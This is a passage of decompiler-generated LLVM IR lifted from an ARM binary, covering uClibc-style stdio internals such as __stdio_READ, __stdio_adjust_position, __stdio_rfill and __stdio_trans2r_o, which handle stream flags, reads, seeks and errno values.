  %v1_30d50 = inttoptr i32 %v0_30d5c to i16*
  %v2_30d50 = load i16, i16* %v1_30d50, align 2
  %v1_30d54 = and i16 %v2_30d50, 64
  %v2_30d54 = icmp eq i16 %v1_30d54, 0
  br i1 %v2_30d54, label %dec_label_pc_30d6c, label %dec_label_pc_30d5c

dec_label_pc_30d5c:                               ; preds = %dec_label_pc_30d50
  store i32 %v0_30d5c, i32* @r0, align 4
  %v0_30d60 = call i32 @__stdio_wcommit()
  %v2_30d64 = icmp eq i32 %v0_30d60, 0
  br i1 %v2_30d64, label %dec_label_pc_30d6c, label %dec_label_pc_30dd4

dec_label_pc_30d6c:                               ; preds = %dec_label_pc_30d5c, %dec_label_pc_30d50
  %v0_30d6c = load i32, i32* @r7, align 4
  %v7_30d6c = icmp eq i32 %v0_30d6c, 1
  br i1 %v7_30d6c, label %dec_label_pc_30d74, label %dec_label_pc_30d6c.dec_label_pc_30d88_crit_edge

dec_label_pc_30d6c.dec_label_pc_30d88_crit_edge:  ; preds = %dec_label_pc_30d6c
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_30d88

dec_label_pc_30d74:                               ; preds = %dec_label_pc_30d6c
  %v0_30d74 = load i32, i32* @r5, align 4
  %v2_30d78 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_30d78, i32* %r1.global-to-local, align 4
  %v2_30d7c = inttoptr i32 %v0_30d74 to i16*
  %v3_30d7c = call i32 @__stdio_adjust_position(i16* %v2_30d7c, i32 %v2_30d78)
  %v1_30d80 = icmp slt i32 %v3_30d7c, 0
  br i1 %v1_30d80, label %dec_label_pc_30dd4, label %dec_label_pc_30d74.dec_label_pc_30d88_crit_edge

dec_label_pc_30d74.dec_label_pc_30d88_crit_edge:  ; preds = %dec_label_pc_30d74
  %v0_30d88.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_30d88

dec_label_pc_30d88:                               ; preds = %dec_label_pc_30d6c.dec_label_pc_30d88_crit_edge, %dec_label_pc_30d74.dec_label_pc_30d88_crit_edge
  %v2_30d90.pre-phi = phi i32 [ %.pre, %dec_label_pc_30d6c.dec_label_pc_30d88_crit_edge ], [ %v2_30d78, %dec_label_pc_30d74.dec_label_pc_30d88_crit_edge ]
  %v0_30d88 = phi i32 [ %v0_30d6c, %dec_label_pc_30d6c.dec_label_pc_30d88_crit_edge ], [ %v0_30d88.pre, %dec_label_pc_30d74.dec_label_pc_30d88_crit_edge ]
  store i32 %v0_30d88, i32* %r2.global-to-local, align 4
  %v0_30d8c = load i32, i32* @r5, align 4
  store i32 %v2_30d90.pre-phi, i32* %r1.global-to-local, align 4
  %v4_30d94 = call i32 @__stdio_seek(i32 %v0_30d8c, i32* nonnull %stack_var_-32, i32 %v0_30d88)
  %v1_30d98 = icmp slt i32 %v4_30d94, 0
  br i1 %v1_30d98, label %dec_label_pc_30dd4, label %dec_label_pc_30da0

dec_label_pc_30da0:                               ; preds = %dec_label_pc_30d88
  %v0_30da0 = load i32, i32* @r5, align 4
  %v1_30da0 = inttoptr i32 %v0_30da0 to i16*
  %v2_30da0 = load i16, i16* %v1_30da0, align 2
  %v1_30da4 = add i32 %v0_30da0, 8
  %v2_30da4 = inttoptr i32 %v1_30da4 to i32*
  %v3_30da4 = load i32, i32* %v2_30da4, align 4
  store i32 %v3_30da4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_30dac = and i16 %v2_30da0, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_30dac, i16* %v1_30da0, align 2
  %v0_30db8 = load i32, i32* %r2.global-to-local, align 4
  %v1_30db8 = load i32, i32* @r5, align 4
  %v2_30db8 = add i32 %v1_30db8, 28
  %v3_30db8 = inttoptr i32 %v2_30db8 to i32*
  store i32 %v0_30db8, i32* %v3_30db8, align 4
  %v0_30dbc = load i32, i32* %r1.global-to-local, align 4
  %v1_30dbc = trunc i32 %v0_30dbc to i8
  %v2_30dbc = load i32, i32* @r5, align 4
  %v3_30dbc = add i32 %v2_30dbc, 2
  %v4_30dbc = inttoptr i32 %v3_30dbc to i8*
  store i8 %v1_30dbc, i8* %v4_30dbc, align 1
  %v0_30dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_30dc0 = load i32, i32* @r5, align 4
  %v2_30dc0 = add i32 %v1_30dc0, 16
  %v3_30dc0 = inttoptr i32 %v2_30dc0 to i32*
  store i32 %v0_30dc0, i32* %v3_30dc0, align 4
  %v0_30dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_30dc4 = load i32, i32* @r5, align 4
  %v2_30dc4 = add i32 %v1_30dc4, 20
  %v3_30dc4 = inttoptr i32 %v2_30dc4 to i32*
  store i32 %v0_30dc4, i32* %v3_30dc4, align 4
  %v0_30dc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_30dc8 = load i32, i32* @r5, align 4
  %v2_30dc8 = add i32 %v1_30dc8, 24
  %v3_30dc8 = inttoptr i32 %v2_30dc8 to i32*
  store i32 %v0_30dc8, i32* %v3_30dc8, align 4
  %v0_30dcc = load i32, i32* %r1.global-to-local, align 4
  %v1_30dcc = load i32, i32* @r5, align 4
  %v2_30dcc = add i32 %v1_30dcc, 44
  %v3_30dcc = inttoptr i32 %v2_30dcc to i32*
  store i32 %v0_30dcc, i32* %v3_30dcc, align 4
  br label %dec_label_pc_30dd8

dec_label_pc_30dd4:                               ; preds = %dec_label_pc_30d5c, %dec_label_pc_30d88, %dec_label_pc_30d74
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30dd8

dec_label_pc_30dd8:                               ; preds = %dec_label_pc_30da0, %dec_label_pc_30dd4
  %v0_30dd8 = load i32, i32* %r8.global-to-local, align 4
  %v2_30dd8 = icmp eq i32 %v0_30dd8, 0
  br i1 %v2_30dd8, label %dec_label_pc_30dd8..thread6_crit_edge, label %bb18

dec_label_pc_30dd8..thread6_crit_edge:            ; preds = %dec_label_pc_30dd8
  %v0_30df0.pre = load i32, i32* @ip, align 4
  br label %.thread6

bb18:                                             ; preds = %dec_label_pc_30dd8
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_30de8 = load i32, i32* %r6.global-to-local, align 4
  %v3_30de8 = add i32 %v1_30de8, 76
  %v4_30de8 = inttoptr i32 %v3_30de8 to i32*
  %v5_30de8 = load i32, i32* %v4_30de8, align 4
  store i32 %v5_30de8, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_30dd8..thread6_crit_edge, %bb18
  %v0_30df0 = phi i32 [ %v0_30df0.pre, %dec_label_pc_30dd8..thread6_crit_edge ], [ %v5_30de8, %bb18 ]
  %v2_30df0 = xor i1 %v2_30dd8, true
  call void @__pseudo_cond_branch(i1 %v2_30df0, i32 %v0_30df0)
  br label %dec_label_pc_30df4

dec_label_pc_30df4:                               ; preds = %dec_label_pc_30cf0, %.thread6
  %v0_30df4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_30cc8, i32* @r4, align 4
  store i32 %v6_30cc8, i32* @r5, align 4
  store i32 %v12_30cc8, i32* @r7, align 4
  ret i32 %v0_30df4

; uselistorder directives
  uselistorder i32 %v0_30d88, { 1, 0 }
  uselistorder i32 %v3_30d04, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32 22, { 21, 22, 23, 49, 41, 24, 25, 26, 42, 27, 28, 29, 30, 31, 50, 43, 53, 32, 10, 51, 33, 34, 35, 36, 37, 38, 11, 44, 0, 1, 2, 3, 52, 4, 12, 13, 5, 14, 6, 7, 19, 20, 15, 45, 8, 9, 46, 47, 48, 16, 54, 39, 40, 17, 18 }
  uselistorder label %dec_label_pc_30df4, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_30dd8, { 1, 0 }
  uselistorder label %dec_label_pc_30dd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_30d88, { 1, 0 }
  uselistorder label %dec_label_pc_30d50, { 2, 1, 0 }
}

define i32 @function_30e08(i32 %arg1) local_unnamed_addr {
dec_label_pc_30e08:
  %v0_30e08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_30e08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_30e08
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_30e08, %bb
  %v4_30e14 = phi i32 [ %arg1, %dec_label_pc_30e08 ], [ 0, %bb ]
  ret i32 %v4_30e14

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_30e18 = load i32, i32* @r4, align 4
  store i32 %v3_30e18, i32* %stack_var_-12, align 4
  %v0_30e1c = load i32, i32* %r0.global-to-local, align 4
  %v1_30e1c = inttoptr i32 %v0_30e1c to i16*
  %v2_30e1c = load i16, i16* %v1_30e1c, align 2
  %v3_30e1c = zext i16 %v2_30e1c to i32
  %v1_30e20 = and i32 %v3_30e1c, 4
  store i32 %v1_30e20, i32* %r5.global-to-local, align 4
  %v2_30e20 = icmp eq i32 %v1_30e20, 0
  store i32 %v0_30e1c, i32* %r4.global-to-local, align 4
  br i1 %v2_30e20, label %dec_label_pc_30e34, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_30e34:                               ; preds = %entry
  %v1_30e34 = icmp slt i32 %arg2, 0
  br i1 %v1_30e34, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_30e34
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_30e34, %bb18
  %v1_30e3c = add i32 %v0_30e1c, 4
  %v2_30e3c = inttoptr i32 %v1_30e3c to i32*
  %v3_30e3c = load i32, i32* %v2_30e3c, align 4
  store i32 %v3_30e3c, i32* %r0.global-to-local, align 4
  %v1_30e40 = call i32 @__GI_read(i32 %v3_30e3c)
  store i32 %v1_30e40, i32* %r0.global-to-local, align 4
  %v5_30e48 = icmp sgt i32 %v1_30e40, 0
  br i1 %v5_30e48, label %.thread7, label %dec_label_pc_30e4c

dec_label_pc_30e4c:                               ; preds = %bb19
  %v2_30e44 = icmp eq i32 %v1_30e40, 0
  %v0_30e4c = load i32, i32* %r4.global-to-local, align 4
  %v1_30e4c = inttoptr i32 %v0_30e4c to i16*
  %v2_30e4c = load i16, i16* %v1_30e4c, align 2
  br i1 %v2_30e44, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_30e4c
  %v2_30e50 = or i16 %v2_30e4c, 4
  store i16 %v2_30e50, i16* %v1_30e4c, align 2
  %v1_30e6c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_30e4c
  %v2_30e54 = or i16 %v2_30e4c, 8
  store i16 %v2_30e54, i16* %v1_30e4c, align 2
  %v1_30e60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_30e60, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_30e6c = phi i32 [ %v1_30e6c.pre, %bb20 ], [ 0, %bb ], [ %v1_30e40, %bb19 ], [ %v1_30e60, %bb21 ]
  %v2_30e68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_30e68, i32* @r4, align 4
  ret i32 %v1_30e6c

; uselistorder directives
  uselistorder i16 %v2_30e4c, { 1, 0 }
  uselistorder i32 %v1_30e40, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 0, 3, 2, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_30e70 = load i32, i32* @r4, align 4
  store i32 %v3_30e70, i32* %stack_var_-12, align 4
  %v3_30e74 = load i16, i16* %arg1, align 2
  %v4_30e74 = zext i16 %v3_30e74 to i32
  store i32 %v4_30e74, i32* @ip, align 4
  %tmp17 = urem i16 %v3_30e74, 4
  %v1_30e78 = zext i16 %tmp17 to i32
  store i32 %v1_30e78, i32* %r2.global-to-local, align 4
  %v2_30e78 = icmp eq i16 %tmp17, 0
  br i1 %v2_30e78, label %bb, label %dec_label_pc_30e8c

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_30e8c:                               ; preds = %entry
  %v1_30e8c = add nsw i32 %v1_30e78, -1
  %v7_30e8c = icmp eq i16 %tmp17, 1
  br i1 %v7_30e8c, label %bb14, label %dec_label_pc_30e94

dec_label_pc_30e94:                               ; preds = %dec_label_pc_30e8c
  %v1_30e94 = and i32 %v4_30e74, 2048
  %v2_30e94 = icmp eq i32 %v1_30e94, 0
  br i1 %v2_30e94, label %bb14, label %dec_label_pc_30e9c

dec_label_pc_30e9c:                               ; preds = %dec_label_pc_30e94
  %v7_30e9c = icmp eq i32 %v1_30e8c, 2
  br i1 %v7_30e9c, label %dec_label_pc_30f20, label %dec_label_pc_30ea4

dec_label_pc_30ea4:                               ; preds = %dec_label_pc_30e9c
  %v2_30ea4 = add i32 %tmp, 40
  %v3_30ea4 = inttoptr i32 %v2_30ea4 to i32*
  %v4_30ea4 = load i32, i32* %v3_30ea4, align 4
  store i32 %v4_30ea4, i32* %r3.global-to-local, align 4
  %v2_30ea8 = icmp eq i32 %v4_30ea4, 0
  br i1 %v2_30ea8, label %dec_label_pc_30eb0, label %dec_label_pc_30f20

dec_label_pc_30eb0:                               ; preds = %dec_label_pc_30ea4
  %v2_30eb0 = add i32 %tmp, 44
  %v3_30eb0 = inttoptr i32 %v2_30eb0 to i32*
  %v4_30eb0 = load i32, i32* %v3_30eb0, align 4
  store i32 %v4_30eb0, i32* %r3.global-to-local, align 4
  %v2_30eb4 = add i32 %tmp, 3
  %v3_30eb4 = inttoptr i32 %v2_30eb4 to i8*
  %v4_30eb4 = load i8, i8* %v3_30eb4, align 1
  %v5_30eb4 = zext i8 %v4_30eb4 to i32
  store i32 %v5_30eb4, i32* %r2.global-to-local, align 4
  %v2_30eb8 = icmp eq i32 %v4_30eb0, 0
  br i1 %v2_30eb8, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_30eb0
  %v1_30ec03 = sub nsw i32 0, %v5_30eb4
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_30eb0
  %v3_30ebc = add i32 %tmp, 2
  %v4_30ebc = inttoptr i32 %v3_30ebc to i8*
  %v5_30ebc = load i8, i8* %v4_30ebc, align 1
  %v6_30ebc = zext i8 %v5_30ebc to i32
  store i32 %v6_30ebc, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_30ebc, %v5_30eb4
  %v3_30ec4 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_30e94, %dec_label_pc_30e8c, %bb13
  %v1_30ed8 = phi i32 [ %v1_30ec03, %.thread1 ], [ %v1_30e8c, %dec_label_pc_30e94 ], [ %v1_30e8c, %dec_label_pc_30e8c ], [ 0, %bb ], [ %v3_30ec4, %bb13 ]
  %v1_30ec8 = and i32 %v4_30e74, 64
  %v2_30ec8 = icmp eq i32 %v1_30ec8, 0
  %v2_30ecc = add i32 %tmp, 16
  %v3_30ecc = inttoptr i32 %v2_30ecc to i32*
  %v4_30ecc = load i32, i32* %v3_30ecc, align 4
  store i32 %v4_30ecc, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_30ec8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_30ed8 = sub i32 %v1_30ed8, %v4_30ecc
  store i32 %v2_30ed8, i32* %r3.global-to-local, align 4
  %v1_30edc = inttoptr i32 %arg2 to i32*
  %v2_30edc = load i32, i32* %v1_30edc, align 4
  store i32 %v2_30edc, i32* %r0.global-to-local, align 4
  %v3_30edc = add i32 %arg2, 4
  %v4_30edc = inttoptr i32 %v3_30edc to i32*
  %v5_30edc = load i32, i32* %v4_30edc, align 4
  %v2_30ee0 = add i32 %storemerge, %v2_30ed8
  store i32 %v2_30ee0, i32* %r4.global-to-local, align 4
  %v2_30ee4 = sub i32 %v2_30edc, %v2_30ee0
  store i32 %v2_30ee4, i32* %r2.global-to-local, align 4
  %v2_30ee8 = and i32 %v2_30ee0, 1073741824
  %v3_30ee8 = icmp ne i32 %v2_30ee8, 0
  %v4_30ee8 = ashr i32 %v2_30ee0, 31
  %v6_30ee8 = icmp eq i1 %v3_30ee8, false
  %v7_30ee8 = sub i32 %v5_30edc, %v4_30ee8
  %v9_30ee8 = sext i1 %v6_30ee8 to i32
  %v10_30ee8 = add i32 %v7_30ee8, %v9_30ee8
  store i32 %v10_30ee8, i32* %r3.global-to-local, align 4
  %v2_30eec = sub i32 %v10_30ee8, %v5_30edc
  %v4_30eec = xor i32 %v10_30ee8, %v5_30edc
  %v5_30eec = xor i32 %v2_30eec, %v10_30ee8
  %v6_30eec = and i32 %v5_30eec, %v4_30eec
  %v7_30eec = icmp slt i32 %v6_30eec, 0
  %v8_30eec = icmp slt i32 %v2_30eec, 0
  %v9_30eec = icmp eq i32 %v10_30ee8, %v5_30edc
  store i32 %v2_30ee4, i32* %v1_30edc, align 4
  %v5_30ef0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_30ef0, i32* %v4_30edc, align 4
  %v3_30ef4 = xor i1 %v8_30eec, %v7_30eec
  %v4_30ef4 = or i1 %v9_30eec, %v3_30ef4
  br i1 %v4_30ef4, label %dec_label_pc_30ef8, label %dec_label_pc_30f04

dec_label_pc_30ef8:                               ; preds = %bb14
  br i1 %v9_30eec, label %dec_label_pc_30efc, label %dec_label_pc_30f08thread-pre-split

dec_label_pc_30efc:                               ; preds = %dec_label_pc_30ef8
  %v0_30efc = load i32, i32* %r2.global-to-local, align 4
  %v1_30efc = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_30efc, %v1_30efc
  br i1 %tmp18, label %dec_label_pc_30f04, label %dec_label_pc_30f08thread-pre-split

dec_label_pc_30f04:                               ; preds = %dec_label_pc_30efc, %bb14
  %v0_30f04 = load i32, i32* %r4.global-to-local, align 4
  %v1_30f04 = sub i32 0, %v0_30f04
  store i32 %v1_30f04, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30f08

dec_label_pc_30f08thread-pre-split:               ; preds = %dec_label_pc_30efc, %dec_label_pc_30ef8
  %v0_30f08.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30f08

dec_label_pc_30f08:                               ; preds = %dec_label_pc_30f08thread-pre-split, %dec_label_pc_30f04
  %v0_30f08 = phi i32 [ %v0_30f08.pr, %dec_label_pc_30f08thread-pre-split ], [ %v1_30f04, %dec_label_pc_30f04 ]
  %v1_30f08 = icmp slt i32 %v0_30f08, 0
  br i1 %v1_30f08, label %dec_label_pc_30f10, label %dec_label_pc_30f24

dec_label_pc_30f10:                               ; preds = %dec_label_pc_30f08
  %v0_30f10 = call i32 @__GI___errno_location()
  store i32 %v0_30f10, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_30f18 = inttoptr i32 %v0_30f10 to i32*
  store i32 75, i32* %v2_30f18, align 4
  %v0_30f24.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30f24

dec_label_pc_30f20:                               ; preds = %dec_label_pc_30ea4, %dec_label_pc_30e9c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30f24

dec_label_pc_30f24:                               ; preds = %dec_label_pc_30f08, %dec_label_pc_30f10, %dec_label_pc_30f20
  %v0_30f24 = phi i32 [ %v0_30f08, %dec_label_pc_30f08 ], [ %v0_30f24.pre, %dec_label_pc_30f10 ], [ -1, %dec_label_pc_30f20 ]
  store i32 %v0_30f24, i32* %r0.global-to-local, align 4
  %v2_30f2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_30f2c, i32* @r4, align 4
  ret i32 %v0_30f24

; uselistorder directives
  uselistorder i32 %v0_30f24, { 1, 0 }
  uselistorder i1 %v9_30eec, { 1, 0 }
  uselistorder i32 %v2_30eec, { 1, 0 }
  uselistorder i32 %v10_30ee8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_30edc, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 2, 1 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_30f24, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_30f34 = load i32, i32* @r4, align 4
  store i32 %v3_30f34, i32* %stack_var_-8, align 4
  %v1_30f38 = add i32 %arg1, 8
  %v1_30f3c = inttoptr i32 %v1_30f38 to i32*
  %v2_30f3c = load i32, i32* %v1_30f3c, align 4
  %v3_30f3c = add i32 %arg1, 12
  %v4_30f3c = inttoptr i32 %v3_30f3c to i32*
  %v5_30f3c = load i32, i32* %v4_30f3c, align 4
  %v2_30f40 = sub i32 %v5_30f3c, %v2_30f3c
  store i32 %v2_30f40, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_30f48 = inttoptr i32 %arg1 to i16*
  %v4_30f48 = call i32 @__stdio_READ(i16* %v3_30f48, i32 %v2_30f3c, i32 %v2_30f40)
  %v0_30f4c = load i32, i32* @r4, align 4
  %v1_30f4c = add i32 %v0_30f4c, 8
  %v2_30f4c = inttoptr i32 %v1_30f4c to i32*
  %v3_30f4c = load i32, i32* %v2_30f4c, align 4
  store i32 %v3_30f4c, i32* %r2.global-to-local, align 4
  %v2_30f50 = add i32 %v3_30f4c, %v4_30f48
  %v2_30f54 = add i32 %v0_30f4c, 20
  %v3_30f54 = inttoptr i32 %v2_30f54 to i32*
  store i32 %v2_30f50, i32* %v3_30f54, align 4
  %v0_30f58 = load i32, i32* %r2.global-to-local, align 4
  %v1_30f58 = load i32, i32* @r4, align 4
  %v2_30f58 = add i32 %v1_30f58, 16
  %v3_30f58 = inttoptr i32 %v2_30f58 to i32*
  store i32 %v0_30f58, i32* %v3_30f58, align 4
  %v2_30f5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_30f5c, i32* @r4, align 4
  ret i32 %v4_30f48

; uselistorder directives
  uselistorder i32 %v4_30f48, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_30f64 = load i32, i32* @r4, align 4
  store i32 %v3_30f64, i32* %stack_var_-12, align 4
  %v0_30f68 = load i32, i32* @r0, align 4
  %v1_30f68 = inttoptr i32 %v0_30f68 to i16*
  %v2_30f68 = load i16, i16* %v1_30f68, align 2
  %v3_30f68 = zext i16 %v2_30f68 to i32
  store i32 %v3_30f68, i32* %r3.global-to-local, align 4
  %v0_30f6c = load i32, i32* @r1, align 4
  %v2_30f6c = and i32 %v0_30f6c, %v3_30f68
  %v4_30f6c = icmp eq i32 %v2_30f6c, 0
  store i32 %v0_30f68, i32* @r4, align 4
  br i1 %v4_30f6c, label %dec_label_pc_30f7c, label %dec_label_pc_30f8c

dec_label_pc_30f7c:                               ; preds = %entry
  %v1_30f7c = and i32 %v3_30f68, 2176
  %v2_30f7c = icmp eq i32 %v1_30f7c, 0
  br i1 %v2_30f7c, label %dec_label_pc_30f84, label %dec_label_pc_30f98

dec_label_pc_30f84:                               ; preds = %dec_label_pc_30f7c
  %v2_30f84 = or i32 %v0_30f6c, %v3_30f68
  store i32 %v2_30f84, i32* %r3.global-to-local, align 4
  %v1_30f88 = trunc i32 %v2_30f84 to i16
  store i16 %v1_30f88, i16* %v1_30f68, align 2
  %v0_30f8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_30f8c

dec_label_pc_30f8c:                               ; preds = %entry, %dec_label_pc_30f84
  %v0_30f8c = phi i32 [ %v0_30f68, %entry ], [ %v0_30f8c.pre, %dec_label_pc_30f84 ]
  %v1_30f8c = inttoptr i32 %v0_30f8c to i16*
  %v2_30f8c = load i16, i16* %v1_30f8c, align 2
  %v3_30f8c = zext i16 %v2_30f8c to i32
  store i32 %v3_30f8c, i32* %r3.global-to-local, align 4
  %v1_30f90 = and i32 %v3_30f8c, 16
  store i32 %v1_30f90, i32* %r5.global-to-local, align 4
  %v2_30f90 = icmp eq i32 %v1_30f90, 0
  br i1 %v2_30f90, label %dec_label_pc_30fb8, label %dec_label_pc_30f98

dec_label_pc_30f98:                               ; preds = %dec_label_pc_30f7c, %dec_label_pc_30f8c
  %v0_30f98 = call i32 @__GI___errno_location()
  store i32 %v0_30f98, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_30fa0 = inttoptr i32 %v0_30f98 to i32*
  store i32 9, i32* %v2_30fa0, align 4
  br label %dec_label_pc_30fa4

dec_label_pc_30fa4:                               ; preds = %dec_label_pc_30fc0, %dec_label_pc_30f98
  %v0_30fa4 = load i32, i32* @r4, align 4
  %v1_30fa4 = inttoptr i32 %v0_30fa4 to i16*
  %v2_30fa4 = load i16, i16* %v1_30fa4, align 2
  %v3_30fa4 = zext i16 %v2_30fa4 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_30fac = or i32 %v3_30fa4, 8
  store i32 %v1_30fac, i32* %r3.global-to-local, align 4
  %v1_30fb0 = trunc i32 %v1_30fac to i16
  store i16 %v1_30fb0, i16* %v1_30fa4, align 2
  %v1_30ff8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_30ff0

dec_label_pc_30fb8:                               ; preds = %dec_label_pc_30f8c
  %v1_30fb8 = and i32 %v3_30f8c, 64
  %v2_30fb8 = icmp eq i32 %v1_30fb8, 0
  br i1 %v2_30fb8, label %dec_label_pc_30fe0, label %dec_label_pc_30fc0

dec_label_pc_30fc0:                               ; preds = %dec_label_pc_30fb8
  %v0_30fc0 = call i32 @__stdio_wcommit()
  store i32 %v0_30fc0, i32* %r0.global-to-local, align 4
  %v2_30fc4 = icmp eq i32 %v0_30fc0, 0
  br i1 %v2_30fc4, label %dec_label_pc_30fcc, label %dec_label_pc_30fa4

dec_label_pc_30fcc:                               ; preds = %dec_label_pc_30fc0
  %v0_30fcc = load i32, i32* @r4, align 4
  %v1_30fcc = inttoptr i32 %v0_30fcc to i16*
  %v2_30fcc = load i16, i16* %v1_30fcc, align 2
  %v3_30fcc = zext i16 %v2_30fcc to i32
  store i32 %v3_30fcc, i32* %r3.global-to-local, align 4
  %v1_30fd0 = add i32 %v0_30fcc, 8
  %v2_30fd0 = inttoptr i32 %v1_30fd0 to i32*
  %v3_30fd0 = load i32, i32* %v2_30fd0, align 4
  %v1_30fd4 = and i32 %v3_30fcc, 65471
  store i32 %v1_30fd4, i32* %r3.global-to-local, align 4
  %v2_30fd8 = add i32 %v0_30fcc, 28
  %v3_30fd8 = inttoptr i32 %v2_30fd8 to i32*
  store i32 %v3_30fd0, i32* %v3_30fd8, align 4
  %v0_30fdc = load i32, i32* %r3.global-to-local, align 4
  %v1_30fdc = trunc i32 %v0_30fdc to i16
  %v2_30fdc = load i32, i32* @r4, align 4
  %v3_30fdc = inttoptr i32 %v2_30fdc to i16*
  store i16 %v1_30fdc, i16* %v3_30fdc, align 2
  %v0_30fe0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_30fe0

dec_label_pc_30fe0:                               ; preds = %dec_label_pc_30fb8, %dec_label_pc_30fcc
  %v2_30fe8 = phi i32 [ %v0_30f8c, %dec_label_pc_30fb8 ], [ %v0_30fe0.pre, %dec_label_pc_30fcc ]
  %v1_30fe0 = inttoptr i32 %v2_30fe8 to i16*
  %v2_30fe0 = load i16, i16* %v1_30fe0, align 2
  %v3_30fe0 = zext i16 %v2_30fe0 to i32
  %v1_30fe4 = or i32 %v3_30fe0, 1
  store i32 %v1_30fe4, i32* %r3.global-to-local, align 4
